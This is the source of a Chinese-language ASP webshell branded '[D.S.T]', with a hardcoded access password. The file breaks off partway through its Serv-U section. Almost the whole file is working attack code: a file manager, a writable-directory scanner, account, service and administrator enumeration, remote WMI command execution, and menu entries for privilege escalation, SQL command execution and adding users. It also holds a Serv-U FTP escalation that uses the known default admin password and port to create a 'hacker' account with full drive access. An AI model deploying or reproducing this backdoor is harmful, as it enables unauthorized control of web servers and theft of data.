<%@ LANGUAGE = VBScript %>
<%
  
UserPass="wmphp.com"               
mnAme="����[D.S.T]������ų�ǿ��ɱASP����"
SiteuRL="http://www.wmphp.com"           
CopyriGht="�����ľ�������˽�ķ��ײ�����������׷�� ���汾��ȥ����!"    
AD="רҵ�������˰���ɱ�޺���ASP���� BY��Dbs  QQ��136882447"
imgurl="<hr>"

Server.ScriptTimeout=999999999:Response.Buffer =true
On Error Resume Next
sub ShowErr()
If Err Then
RRS"<br><a href='javascript:history.back()'><br> " & Err.Description & "</a><br>"
Err.Clear
Response.Flush
End If
end sub

Sub RRS(str)
response.write(str)
End Sub

Function RePath(S)
RePath=Replace(S,"\","\\")           
End Function

Function RRePath(S)
RRePath=Replace(S,"\\","\")         
End Function

URL=Request.ServerVariables("URL")
ServerIP=Request.ServerVariables("LOCAL_ADDR")
Action=Request("Action")
RootPath=Server.MapPath(".")
WWWRoot=Server.MapPath("/")
u=request.servervariables("http_host")&url
p=userpass:posurl="http"
FolderPath=Request("FolderPath")
FName=Request("FName")
BackUrl="<br><br><center><a href='javascript:history.back()'>����</a></center>"

function face(Color,Siz,Var)
if Siz=0 Then
siz=""
Else
siz=" size='"&Siz&"'"                      
end If
face="<FONT face=Webdings color='#"&Color&"' "&Siz&">"&Var&"</FONT>"               '��������ֵΪ
End Function

RRS"<html><meta http-equiv=""Content-Type"" content=""text/html; charset=gb2312"">":RRS"<title>"&mName&" - "&SErvErIP&" </title>"
RRS"<style type=""text/css"">"
RRS"body,td{font-size: 12px;background-color:#000000;color:lime;scrollbar-face-color: #000000; scrollbar-highlight-color: #008000;  scrollbar-shadow-color: #008000;  scrollbar-3dlight-color: #000000;  scrollbar-arrow-color: #000000;  scrollbar-track-color: #000000;  font-family: verdana;  scrollbar-darkshadow-color: #000000;}"
RRS"input,select,textarea{font-size: 12px;background-color:#ddd;border:1px solid #fff}"
RRS".C{background-color:#000000;border:0px}":RRS".cmd{background-color:#000;color:lime}":RRS"body{margin: 0px;margin-left:4px;}"
RRS"a{color:lime;text-decoration: none;}a:hover{color:lime;background:#000}":RRS".am{color:#55AA66;font-size:11px;}":RRS"</style>"
RRS"<script language=javascript>function killErrors(){return true;}window.onerror=killErrors;"
RRS"function yesok(){if (confirm(""ȷ��Ҫִ�д˲�����""))return true;else return false;}"
RRS"function runClock(){theTime = window.setTimeout(""runClock()"", 100);var today = new Date();var display= today.toLocaleString();window.status=""��"&AD&"  --""+display;}runClock();"
RRS"function ShowFolder(Folder){top.addrform.FolderPath.value = Folder;top.addrform.submit();}"
RRS"function FullForm(FName,FAction){top.hideform.FName.value = FName;if(FAction==""CopyFile""){DName = prompt(""�����븴�Ƶ�Ŀ���ļ�ȫ����"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""MoveFile""){DName = prompt(""�������ƶ���Ŀ���ļ�ȫ����"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""CopyFolder""){DName = prompt(""�������ƶ���Ŀ���ļ���ȫ����"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""MoveFolder""){DName = prompt(""�������ƶ���Ŀ���ļ���ȫ����"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""NewFolder""){DName = prompt(""������Ҫ�½����ļ���ȫ����"",FName);top.hideform.FName.value = DName;}else if(FAction==""CreateMdb""){DName = prompt(""������Ҫ�½���Mdb�ļ�ȫ����,ע�ⲻ��ͬ����"",FName);top.hideform.FName.value = DName;}else if(FAction==""CompactMdb""){DName = prompt(""������Ҫѹ����Mdb�ļ�ȫ����,ע���ļ��Ƿ���ڣ�"",FName);top.hideform.FName.value = DName;}else{DName = ""Other"";}if(DName!=null){top.hideform.Action.value = FAction;top.hideform.submit();}else{top.hideform.FName.value = """";}}"
RRS"function DbCheck(){if(DbForm.DbStr.value == """"){alert(""�����������ݿ�"");FullDbStr(0);return false;}return true;}"
RRS"function FullDbStr(i){if(i<0){return false;}Str = new Array(12);Str[0] = ""Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&RePath(Session("FolderPath"))&"\\db.mdb;Jet OLEDB:Database Password=***"";Str[1] = ""Driver={Sql Server};Server="&ServerIP&",1433;Database=DbName;Uid=sa;Pwd=****"";Str[2] = ""Driver={MySql};Server="&ServerIP&";Port=3306;Database=DbName;Uid=root;Pwd=****"";Str[3] = ""Dsn=DsnName"";Str[4] = ""SELECT * FROM [TableName] WHERE ID<100"";Str[5] = ""INSERT INTO [TableName](USER,PASS) VALUES(\'username\',\'password\')"";Str[6] = ""DELETE FROM [TableName] WHERE ID=100"";Str[7] = ""UPDATE [TableName] SET USER=\'username\' WHERE ID=100"";Str[8] = ""CREATE TABLE [TableName](ID INT IDENTITY (1,1) NOT NULL,USER VARCHAR(50))"";Str[9] = ""DROP TABLE [TableName]"";Str[10]= ""ALTER TABLE [TableName] ADD COLUMN PASS VARCHAR(32)"";Str[11]= ""ALTER TABLE [TableName] DROP COLUMN PASS"";Str[12]= ""��ֻ��ʾһ������ʱ������ʾ�ֶε�ȫ���ֽڣ������������Ʋ�ѯʵ��.\n����һ������ֻ��ʾ�ֶε�ǰ��ʮ���ֽڡ�"";if(i<=3){DbForm.DbStr.value = Str[i];DbForm.SqlStr.value = """";abc.innerHTML=""<center>��ȷ�ϼ��������ݿ�������SQL����������䡣</center>"";}else if(i==12){alert(Str[i]);}else{DbForm.SqlStr.value = Str[i];}return true;}"
RRS"function FullSqlStr(str,pg){if(DbForm.DbStr.value.length<5){alert(""�������ݿ����Ӵ��Ƿ���ȷ!"");return false;}if(str.length<10){alert(""����SQL����Ƿ���ȷ!"");return false;}DbForm.SqlStr.value = str;DbForm.Page.value = pg;abc.innerHTML="""";DbForm.submit();return true;}"
RRS"</script>"
rrs "<body" 
If Action="" then RRS " scroll=no"
rrs ">" 
Dim ObT(13,2):ObT(0,0) = "Scripting.FileSystemObject":ObT(0,2) = "�ļ��������":ObT(1,0) = "wscript.shell":ObT(1,2) = "������ִ�����":ObT(2,0) = "ADOX.Catalog":ObT(2,2) = "ACCESS�������":ObT(3,0) = "JRO.JetEngine":ObT(3,2) = "ACCESSѹ�����":ObT(4,0) = "Scripting.Dictionary" :ObT(4,2) = "�������ϴ��������":ObT(5,0) = "Adodb.connection":ObT(5,2) = "���ݿ��������":ObT(6,0) = "Adodb.Stream":ObT(6,2) = "�������ϴ����":ObT(7,0) = "SoftArtisans.FileUp":ObT(7,2) = "SA-FileUp �ļ��ϴ����":ObT(8,0) = "LyfUpload.UploadFile":ObT(8,2) = "���Ʒ��ļ��ϴ����":ObT(9,0) = "Persits.Upload.1":ObT(9,2) = "ASPUpload �ļ��ϴ����":ObT(10,0) = "JMail.SmtpMail":ObT(10,2) = "JMail �ʼ��շ����":ObT(11,0) = "CDONTS.NewMail":ObT(11,2) = "����SMTP�������":ObT(12,0) = "SmtpMail.SmtpMail.1":ObT(12,2) = "SmtpMail�������":ObT(13,0) = "Microsoft.XMLHTTP":ObT(13,2) = "���ݴ������"
For i=0 To 13
	Set T=Server.CreateObject(ObT(i,0))
	If -2147221005 <> Err Then
	  IsObj=" ��"
	Else
	  IsObj=" ��"
	  Err.Clear
	End If
	Set T=Nothing
	ObT(i,1)=IsObj
Next
If FolderPath<>"" then
  Session("FolderPath")=RRePath(FolderPath)
End If
If Session("FolderPath")="" Then
  FolderPath=RootPath
  Session("FolderPath")=FolderPath
End if

Function MainForm()
RRS"<form name=""hideform"" method=""post"" action="""&URL&""" target=""FileFrame"">"
RRS"<input type=""hidden"" name=""Action"">"
RRS"<input type=""hidden"" name=""FName"">"
RRS"</form>"
RRS"<table width='100%' height='100%'  border=0 cellpadding='0' cellspacing='0'>"
RRS"<tr><td height='30' colspan='2'>"
RRS"<table width='100%'>"
RRS"<form name='addrform' method='post' action='"&URL&"' target='_parent'>"
RRS"<tr><td width='60' align='center'>��ַ����</td><td>"
RRS"<input name='FolderPath' style='width:100%' value='"&Session("FolderPath")&"'>"
RRS"</td><td width='130' align='center'><input name='Submit' type='submit' value='ת��'> <input type='submit' value='ˢ��' onclick='FileFrame.location.reload()'>" 
RRS"  <tr align='center' valign='middle'>"
RRS"<tr>��ȨĿ¼����<a href='javascript:ShowFolder(""C:\\Program Files"")'>Program</a>����<a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\"")'>AllUsers</a>����<a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\����ʼ���˵�\\����\\"")'>����</a>����<a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\Application Data\\Symantec\\pcAnywhere\\"")'>pcAnywhere</a>����<a href='javascript:ShowFolder(""c:\\Program Files\\serv-u\\"")'>serv-u</a>����<a href='javascript:ShowFolder(""C:\\Program Files\\Real"")'>RealServer</a>��     ��<a href='javascript:ShowFolder(""C:\\Program Files\\Microsoft SQL Server\\"")'>SQL</a>����<a href='javascript:ShowFolder(""C:\\WINDOWS\\system32\\config\\"")'>config</a>����<a href='javascript:ShowFolder(""c:\\WINDOWS\\system32\\inetsrv\\data\\"")'>data</a>����<a href='javascript:ShowFolder(""c:\\windows\\Temp\\"")'>Temp</a>��     ��<a href='javascript:ShowFolder(""C:\\RECYCLER\\"")'>RECYCLER</a>����<a href='javascript:ShowFolder(""C:\\php\\"")'>php</a>����<a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\Documents\\"")'>Documents</a>��</td><td>"
RRS"</td></tr></form></table></center></td></tr><tr><td width='170'>"
RRS"<iframe name='Left' src='?Action=MainMenu' width='100%' height='100%' frameborder='0'></iframe></td>"
RRS"<td>"
RRS"<iframe name='FileFrame' src='?Action=Show1File' width='100%' height='100%' frameborder='1'></iframe>"
RRS"</td></tr></table>"
End Function

Function MainMenu()
RRS"<table width='100%' cellspacing='0' cellpadding='0'>"
RRS"<tr><td height='5'></td></tr>"
RRS"<tr><td><center><a href='"&SiteURL&"' target='_blank'><font color=red>"&mName&"</font></center></a><center>"&imgurl&"</center>"
RRS"</td></tr>"
If ObT(0,1)=" ��" Then
RRS"<tr><td height='24'>��Ȩ��/��FSO</td></tr>"
Else
RRS"<tr><td height=22 onmouseover=""menu1.style.display=''""><b>"&face("ff8000","+1","H")&" +�ܲ鿴Ӳ�̡�</b><div id=menu1 style=""width:100%;display='none'"" onmouseout=""menu1.stystyle.display='none'"">"
Set ABC=New LBF:RRS ABC.ShowDriver():Set ABC=Nothing
RRS"</div></td></tr><tr><td height='20'><a href='javascript:ShowFolder("""&RePath(WWWRoot)&""")'>"&face("ff8000",0,"8")&"��վ��Ŀ¼��</a></td></tr>"
RRS"<tr><td height='20'><a href='javascript:ShowFolder("""&RePath(RootPath)&""")'>"&face("ff8000",0,"8")&"������Ŀ¼��</a></td></tr>"
RRS"<tr><td height='20'><a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\NewFolder")&""",""NewFolder"")'>"&face("ff8000",0,"=")&"���½�Ŀ¼��</a></td></tr>"
RRS"<tr><td height='20'><a href='?Action=EditFile' target='FileFrame'>"&face("ff8000",0,"=")&"���½��ı���</a></td></tr>"
RRS"<tr><td height='20'><a href='?Action=UpFile' target='FileFrame'>"&face("ff8000",0,"=")&"���ϴ��ļ���</a></td></tr>"
RRS"<tr><td height='20'><a href='?Action=Cplgm&M=4' target='FileFrame'>"&face("ff8000",0,"=")&"��ָ������</a></td></tr>"
RRS"<tr><td height='20'><a href='?Action=plgm' target='FileFrame'></b>"&face("ff8000",0,"=")&"�����ٹ���</a></div></td></tr>"
RRS"<tr><td height='20'><a href='?Action=Cplgm&M=1' target='FileFrame'>"&face("ff8000",0,"=")&"����ǿ����</a></td></tr>"
RRS"<tr><td height='20'><a href='?Action=Cplgm&M=2' target='FileFrame'>"&face("ff8000",0,"=")&"����ǿ����</a></td></tr>"
RRS"<tr><td height='20'><a href='?Action=Cplgm&M=3' target='FileFrame'>"&face("ff8000",0,"=")&"����ǿ�滻��</a></td></tr>"
RRS"<tr><td height='20'><a href='?Action=kmuma' target='FileFrame'>"&face("ff8000",0,"=")&"����ɱľ��</a></td></tr>"
RRS"<tr><td height='20'><a href='?Action=ScanDriveForm' target='FileFrame'>"&face("ff8000",0,"=")&"����дĿ¼��</a><br>"
RRS"<tr><td height='20'><a href='?Action=nofw' target='FileFrame'>"&face("ff8000",0,"=")&"����FSO-WSHд��</a></td></tr>"
RRS"<tr><td height='20'><a href='?Action=gody' target='FileFrame'>"&face("ff8000",0,"=")&"��©����⡽</a><br>"
RRS"<tr><td height='20'><a href='?Action=getTerminalInfo' target='FileFrame'>"&face("ff8000",0,"=")&"���ն˶˿ڡ�</a><br>"
RRS"<tr><td height='20'><a href='?Action=Alexa' target='FileFrame'>"&face("ff8000",0,"=")&"�����֧�֡�</a><br>"
RRS"<tr><td height='20'><a href='?Action=Course' target='FileFrame'>"&face("ff8000",0,"=")&"��ϵͳ�˺š�</a><br>"
RRS"<tr><td height='20'><a href='?Action=adminab' target='FileFrame'>"&face("ff8000",0,"=")&"�������Ա��</a><br>"
RRS"<tr><td height='20'><a href='?Action=wmi' target='FileFrame'>"&face("ff8000",0,"=")&"��WMI-ִ�С�</a><br>"
RRS"<tr><td height='20'><a href='?Action=fuck'   target='FileFrame'>"&face("ff8000",0,"=")&"����װ�����</a><br>"
RRS"<tr><td height='20'><a href='?Action=hook'   target='FileFrame'>"&face("ff8000",0,"=")&"���������á�</a><br>"
RRS"<tr><td height='20'><a href='?Action=adduser' target='FileFrame'>"&face("ff8000",0,"=")&"�������û���</a><br>"
RRS"<tr><td height='20'><a href='?Action=sqlabc' target='FileFrame'>"&face("ff8000",0,"=")&"��SQL-��Ȩ��</a><br>"
RRS"<tr><td height='22'><a href='?Action=MMD' target='FileFrame'>"&face("ff8000",0,"~")&"��SQL-CMD��</a></td></tr>"
RRS"<tr><td height='20'><a href='?Action=Cmd1Shell' target='FileFrame'>"&face("ff8000",0,"=")&"��CMD-���</a><br>"
RRS"<tr><td height='20'><a href='?Action=Servu' target='FileFrame'>"&face("ff8000",0,"~")&"��SUȫͨɱ��</a><br>"
RRS"<tr><td height='20'><a href='?Action=suftp' target='FileFrame'>"&face("ff8000",0,"~")&"��Su-Ftpɱ��</a><br>"
RRS"<tr><td height='22'><a href='?Action=backup' target='FileFrame'>"&face("ff8000",0,"=")&"�����ݿ��ֶθ��ơ�</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=lp' target='FileFrame'>"&face("ff8000",0,"~")&"������0day��</a></td></tr>"
RRS"<tr><td height='20'><a href='?Action=ScanPort' target='FileFrame'>"&face("ff8000",0,"=")&"���˿�ɨ�衽</a><br>"
RRS"<tr><td height='20'><a href='?Action=upload' target='FileFrame'>"&face("ff8000",0,"=")&"��ֱ�����ء�</a><br>"
RRS"<tr><td height='20'><a href='?Action=ReadREG' target='FileFrame'>"&face("ff8000",0,"=")&"����ע���</a><br>"
RRS"<tr><td height='24' onmouseover=""menu2.style.display=''""><b>"&face("ff8000","+1","P")&"+�����ݿ������</b><div id=menu2 style=""line-height:18px;width:100%;display='none'"" onmouseout=""menu2.style.display='none'"">"
RRS"   <a href='?Action=DbManager' target='FileFrame'>"&face("ff8000",0,"8")&"�����ݿ�</a><br>"
RRS"   <a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\New.mdb")&""",""CreateMdb"")'>"&face("ff8000",0,"8")&"��MDB�ļ�</a><br>"
RRS"   <a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\data.mdb")&""",""CompactMdb"")'>"&face("ff8000",0,"8")&"ѹMDB�ļ�</a></div></td></tr>"
RRS"<tr><td height='22'><a href='?Action=PageAddToMdb' target='FileFrame'>"&face("ff8000",0,"=")&"����վ�����</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=webpor' target='FileFrame'>"&face("ff8000",0,"~")&"�����ߴ���</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=Logout' target='_top'>"&face("ff8000",0,"=")&"����ȫ�˳���</a></td></tr>"
RRS"<tr><td align=center style='color:red'><center>"&imgurl&"</center>"&Copyright&"</td></tr></table>"
RRS"</table>"
End If
End Function

Sub Message(state,msg,flag)
Response.Write "<TABLE width=480 border=0 align=center cellpadding=0 cellspacing=1 bgcolor=#91d70d>"
Response.Write "  <TR>"
Response.Write "    <TD class=TBHead>ϵͳ��Ϣ</TD>"
Response.Write "  </TR>"
Response.Write "  <TR>"
Response.Write "    <TD align=middle bgcolor=#ecfccd>"
Response.Write "	  <TABLE width=82% border=0 cellpadding=5 cellspacing=0>"
Response.Write "	    <TR>"
Response.Write "		  <TD><FONT color=red>"
Response.Write state
Response.Write "</FONT></TD>"
Response.Write "		<TR>"
Response.Write "		  <TD><P>"
Response.Write msg
Response.Write "</P></TD>"
Response.Write "		</TR>"
Response.Write "	  </TABLE>"
Response.Write "	</TD>"
Response.Write "  </TR>"
Response.Write "  <TR>"
Response.Write "    <TD class=TBEnd>"
Response.Write "	"
If flag=0 Then
Response.Write "	      <INPUT type=button value=�ر� onclick=""window.close();"">"
Response.Write "	"
Else
Response.Write "	      <INPUT type=button value=���� onClick=""history.go(-1);"">"
Response.Write "	"
End if
Response.Write "	</TD>"
Response.Write "  </TR>"
Response.Write "</TABLE>"
End Sub

Function Red(str)
    Red = "<FONT color=#ff2222>" & str & "</FONT>"
End Function

Sub ScanDriveForm()
    Dim FSO,DriveB
	Set FSO = Server.Createobject("Scripting.FileSystemObject")
Response.Write "<TABLE width=480 border=0 align=center cellpadding=3 cellspacing=1 bgColor=#91d70d>"
Response.Write "  <TR>"
Response.Write "    <TD colspan=5 class=TBHead>����/ϵͳ�ļ�����Ϣ</TD>"
Response.Write "  </TR>"
For Each DriveB in FSO.Drives
Response.Write "  <TR align=middle class=TBTD>"
Response.Write "    <FORM action="
Response.Write "?Action=ScanDrive&Drive="
Response.Write DriveB.DriveLetter
response.write " method=Post>"
response.write "<TD width=25"&chr(37)&"><B>�̷�</B></TD>"
response.write "<TD width=15"&chr(37)&">"
response.write DriveB.DriveLetter
response.write ":</TD>"
response.write "	<TD width=20"&chr(37)&"><B>����</B></TD>"
response.write "	<TD width=20"&chr(37)&">"
	  Select Case DriveB.DriveType
	      Case 1: Response.write "���ƶ�"
		  Case 2: Response.write "����Ӳ��"
		  Case 3: Response.write "�������"
		  Case 4: Response.write "CD-ROM"
		  Case 5: Response.write "RAM����"
		  Case else: Response.write "δ֪����"
	  End Select
Response.Write "	</TD>"
Response.Write "	<TD><INPUT type=submit value=��ϸ����></TD>"
Response.Write "	</FORM>"
Response.Write "  </TR>"
Next
Response.Write "  <TR class=TBTD>"
Response.Write "    <FORM action="
Response.Write "?Action=ScFolder&Folder="
Response.Write FSO.GetSpecialFolder(0)
Response.Write " method=Post>		  "
Response.Write "	<TD align=middle><B>Windows�ļ���</B></TD>"
Response.Write "	<TD colspan=3>"
Response.Write FSO.GetSpecialFolder(0)
Response.Write "</TD>"
Response.Write "	<TD align=middle><INPUT type=submit value=��ϸ����></TD>"
Response.Write "	</FORM>"
Response.Write "  </TR>"
Response.Write "  <TR class=TBTD>"
Response.Write "    <FORM action="
Response.Write "?Action=ScFolder&Folder="
Response.Write FSO.GetSpecialFolder(1)
Response.Write " method=Post>		  "
Response.Write "	<TD align=middle><B>System32�ļ���</B></TD>"
Response.Write "	<TD colspan=3>"
Response.Write FSO.GetSpecialFolder(1)
Response.Write "</TD>"
Response.Write "	<TD align=middle><INPUT type=submit value=��ϸ����></TD>"
Response.Write "	</FORM>"
Response.Write "  </TR>"
Response.Write "  <TR class=TBTD>"
Response.Write "    <FORM action="
Response.Write "?Action=ScFolder&Folder="
Response.Write FSO.GetSpecialFolder(2)
Response.Write " method=Post>		  "
Response.Write "	<TD align=middle><B>ϵͳ��ʱ�ļ���</B></TD>"
Response.Write "	<TD colspan=3>"
Response.Write FSO.GetSpecialFolder(2)
Response.Write "</TD>"
Response.Write "	<TD align=middle><INPUT type=submit value=��ϸ����></TD>"
Response.Write "	</FORM>"
Response.Write "  </TR>"
Response.Write "</TABLE><BR>"
Response.Write "<DIV align=center>"
Response.Write "<b>��ǰ��վ����·��:"&Server.MapPath("/")&"</b>"
Response.Write "  <FORM Action="
Response.Write "?Action=ScFolder method=Post>ָ���ļ��в�ѯ��"
Response.Write "    <INPUT type=text name=Folder>"
Response.Write "	<INPUT type=submit value=���ɱ���>��ָ���ļ���·�����磺F:\ASP\"
Response.Write "  </FORM>"
Response.Write "<DIV>"
	Set FSO=Nothing
End Sub

Sub ScanDrive(Drive)
    Dim FSO,TestDrive,BaseFolder,TempFolders,Temp_Str,D
	If Drive <> "" Then
	    Set FSO = Server.Createobject("Scripting.FileSystemObject")
		Set TestDrive = FSO.GetDrive(Drive)
		If TestDrive.IsReady Then
		    Temp_Str = "<LI>���̷������ͣ�" & Red(TestDrive.FileSystem) & "<LI>�������кţ�" & Red(TestDrive.SerialNumber) & "<LI>���̹�������" & Red(TestDrive.ShareName) & "<LI>������������" & Red(CInt(TestDrive.TotalSize/1048576)) & "<LI>���̾�����" & Red(TestDrive.VolumeName) & "<LI>���̸�Ŀ¼:" & ScReWr((Drive & ":\"))

			Set BaseFolder = TestDrive.RootFolder
			Set TempFolders = BaseFolder.SubFolders
			For Each D in TempFolders
			    Temp_Str = Temp_Str & "<LI>�ļ��У�" & ScReWr(D)
			Next
			Set TempFolder = Nothing
			Set BaseFolder = Nothing
	    Else
		    Temp_Str = Temp_Str & "<LI>���̸�Ŀ¼:" & Red("���ɶ�:(")
			Dim TempFolderList,t:t=0
			Temp_Str = Temp_Str & "<LI>" & Red("���Ŀ¼���ԣ�")
			TempFolderList = Array("windows","winnt","win","win2000","win98","web","winme","windows2000","asp","php","Tools","Documents and Settings","Program Files","Inetpub","ftp","wmpub","tftp")
			For i = 0 to Ubound(TempFolderList)
			    If FSO.FolderExists(Drive & ":\" & TempFolderList(i)) Then
				    t = t+1
					Temp_Str = Temp_Str & "<LI>�����ļ��У�" & ScReWr(Drive & ":\" & TempFolderList(i))
			    End if
		    Next
			If t=0 then Temp_Str = Temp_Str & "<LI>�����" & Drive & "�̸�Ŀ¼����δ�з���:("
	    End if
		Set TestDrive = Nothing
	    Set FSO = Nothing
		Temp_Str = Temp_Str & "<LI>ע�⣺" & Red("��Ҫ���ˢ�±�ҳ�棬������ֻд�ļ��л����´��������ļ�!")
		Message Drive & ":������Ϣ",Temp_Str,1
	End if
End Sub

Sub ScFolder(folder) 
    On Error Resume Next
	Dim FSO,OFolder,TempFolder,Scmsg,S
	Set FSO = Server.Createobject("Scripting.FileSystemObject")
	If FSO.FolderExists(folder) Then
	    Set OFolder = FSO.GetFolder(folder)
		Set TempFolders = OFolder.SubFolders
		Scmsg = "<LI>ָ���ļ��и�Ŀ¼��" & ScReWr(folder)
		For Each S in TempFolders
		     Scmsg = Scmsg&"<LI>�ļ��У�" & ScReWr(S)  
		Next
		Set TempFolders = Nothing
		Set OFolder = Nothing
	Else
	    Scmsg = Scmsg & "<LI>�ļ��У�" & Red(folder & "�����ڻ��޶�Ȩ��!")
	End if
	Scmsg = Scmsg & "<LI>ע�⣺" & Red("��Ҫ���ˢ�±�ҳ�棬������ֻд�ļ��л����´��������ļ�!")
	Set FSO = Nothing
	Message "�ļ�����Ϣ",Scmsg,1
End Sub

Function ScReWr(folder)
   On Error Resume Next
   Dim FSO,TestFolder,TestFileList,ReWrStr,RndFilename
   Set FSO = Server.Createobject("Scripting.FileSystemObject")
   Set TestFolder = FSO.GetFolder(folder)
   Set TestFileList = TestFolder.SubFolders
   RndFilename = "\temp" & Day(now) & Hour(now) & Minute(now) & Second(now) & ".tmp"
   For Each A in TestFileList
   Next
   If err Then
       err.Clear
	   ReWrStr = folder & "<FONT color=#ff2222> ���ɶ�,"
	   FSO.CreateTextFile folder & RndFilename,True
	   If err Then
	       err.Clear
		   ReWrStr = ReWrStr & "����д��</FONT>"
	   Else
	       ReWrStr = ReWrStr & "��д��</FONT>"
		   FSO.DeleteFile folder & RndFilename,True
	   End If
   Else
       ReWrStr = folder & "<FONT color=#ff2222> �ɶ�,"
	   FSO.CreateTextFile folder & RndFilename,True
	   If err Then
	       err.Clear
		   ReWrStr = ReWrStr & "����д��</FONT>"
	   Else
	       ReWrStr = ReWrStr & "��д��</FONT>"
		   FSO.DeleteFile folder & RndFilename,True
	   End if
   End if
   Set TestFileList = Nothing
   Set TestFolder = Nothing
   Set FSO = Nothing
   ScReWr = ReWrStr
End Function

Function Course()
SI="<br><table width='600' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'>"
SI=SI&"<tr><td height='20' colspan='3' align='center' bgcolor='menu'>ϵͳ�û������</td></tr>"
on error resume next
for each obj in getObject("WinNT://.")
err.clear
if OBJ.StartType="" then
SI=SI&"<tr>"
SI=SI&"<td height=""20"" bgcolor=""#FFFFFF""> "
SI=SI&obj.Name
SI=SI&"</td><td bgcolor=""#FFFFFF""> " 
SI=SI&"ϵͳ�û�(��)"
SI=SI&"</td></tr>"
SI0="<tr><td height=""20"" bgcolor=""#FFFFFF"" colspan=""2""> </td></tr>" 
end if
if OBJ.StartType=2 then lx="�Զ�"
if OBJ.StartType=3 then lx="�ֶ�"
if OBJ.StartType=4 then lx="����"
if LCase(mid(obj.path,4,3))<>"win" and OBJ.StartType=2 then
SI1=SI1&"<tr><td height=""20"" bgcolor=""#FFFFFF""> "&obj.Name&"</td><td height=""20"" bgcolor=""#FFFFFF""> "&obj.DisplayName&"<tr><td height=""20"" bgcolor=""#FFFFFF"" colspan=""2"">[��������:"&lx&"]<font color=#FF0000> "&obj.path&"</font></td></tr>"
else
SI2=SI2&"<tr><td height=""20"" bgcolor=""#FFFFFF""> "&obj.Name&"</td><td height=""20"" bgcolor=""#FFFFFF""> "&obj.DisplayName&"<tr><td height=""20"" bgcolor=""#FFFFFF"" colspan=""2"">[��������:"&lx&"]<font color=#3399FF> "&obj.path&"</font></td></tr>"
end if
next
RRS SI&SI0&SI1&SI2&"</table>"
End Function

Function wmi()
SI="<br><table width='80%' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'>"
RRS "<form name=""form1"" method=""post"" action=""?Action=wmi"">"
RRS "  Զ��ִ������"
RRS "<input name=""xd"" type=""text"" id=""xd"" value=""192.168.0.1"",""root/cimv2"",""hacker$"",""hacker"" size=""70"">"
RRS "    <input type=""submit"" name=""Submit"" value=""�ύ"">"
RRS "</form>"
if request("xd")<>"" then
set ww=server.createobject("wbemscripting.swbemlocator")
set cc=ww.connectserver(request("xd"))
set ss=cc.get("Win32_ProcessStartup")
Set oC=ss.SpawnInstance_
oC.ShowWindow=12
Set pp=cc.get("Win32_Process")
Response.Write pp.create("net user",null,oC,intProcessID)
Response.Write "<br>"&intProcessID
Response.end
end if
End Function

Function adminab()
Response.Expires=0
on error resume next
Set tN=server.createObject("Wscript.Network")
Set objGroup=GetObject("WinNT://"&tN.ComputerName&"/Administrators,group")
For Each admin in objGroup.Members
Response.write admin.Name&"<br>"
Next
if err then
Response.write "�����̵Ĳ��а�:Wscript.Network"
end if
End Function

Function suftp()
rrs"<p><center>Serv-U FTP��Ȩ����--ͨɱ��<br><br>IP����˵��:<br>������IP:0.0.0.0�����κ�IP����������<br>���0.0.0.0���ɹ����޸ĳɴ�IP:"&Request.ServerVariables("LOCAL_ADDR")&"<br>����ٲ��ɹ��ʹ���Serv-u���뱻��</p>"
rrs"<form name='form1' method='post' action=''>"
rrs"<center>������IP:<input name='serip' type='text' class='TextBox' id='duser' value='0.0.0.0'><br>"
rrs"<center>����Ա:<input name='duser' type='text' class='TextBox' id='duser' value='LocalAdministrator'><br>"
rrs"<center>����Ա���� :<input name='dpwd' type='text' class='TextBox' id='dpwd' value='#l@$ak#.lk;0@P'><br>"
rrs"<center>SERV-U�˿�:<input name='dport' type='text' class='TextBox' id='dport' value='43958'><br>"
rrs"<center>��ӵ��û���:<input name='tuser' type='text' class='TextBox' id='tuser' value='hacker'><br>"
rrs"<center>��ӵ��û�����:<input name='tpass' type='text' class='TextBox' id='pass' value='hacker'><br>"
rrs"<center>�ʺŵ����Ե�·��:<input name='tpath' type='text' class='TextBox' id='tpath' value='C:\'><br>"
rrs"<center>����˿�:<input name='tport' type='text' class='TextBox' id='tport' value='21'><br>"
rrs"<center><input name='radiobutton' type='radio' value='add' checked class='TextBox'>ȷ�����"
rrs"<center><input type='radio' name='radiobutton' value='del' class='TextBox'>ȷ��ɾ��"
rrs"<p><input name='Submit' type='submit' class='buttom' value='�ύ'></p></form>"
serverip = request.form("serip")
usr = request.form("duser")
pwd = request.form("dpwd")
port = request.form("dport")
tuser = request.form("tuser")
tpass = request.form("tpass")
tpath = request.form("tpath")
tport = request.form("tport")
hostip = request.form("hostp")
timeout=600
if request.form("radiobutton") = "add" then
leaves = "User " & usr & vbcrlf
leaves = leaves & "Pass " & pwd & vbcrlf
leaves = leaves & "SITE MAINTENANCE" & vbcrlf
leaves = leaves & "-DeleteDOMAIN" & vbcrlf & "-IP=0.0.0.0" & vbcrlf & " PortNo=" & tport & vbcrlf
mt = "SITE MAINTENANCE" & vbcrlf
leaves = leaves & "-SETDOMAIN" & vbcrlf & "-Domain=TEST596|"&serverip&"|" & tport & "|-1|1|0" & vbcrlf & "-TZOEnable=0" & vbcrlf & " TZOKey=" & vbcrlf
leaves = leaves & "-SETUSERSETUP" & vbcrlf & "-IP=0.0.0.0" & vbcrlf & "-PortNo=" & tport & vbcrlf & "-User=" & tuser & vbcrlf & "-Password=" & tpass & vbcrlf & _
"-HomeDir=" & tpath & "\" & vbcrlf & "-LoginMesFile=" & vbcrlf & "-Disable=0" & vbcrlf & "-RelPaths=1" & vbcrlf & _
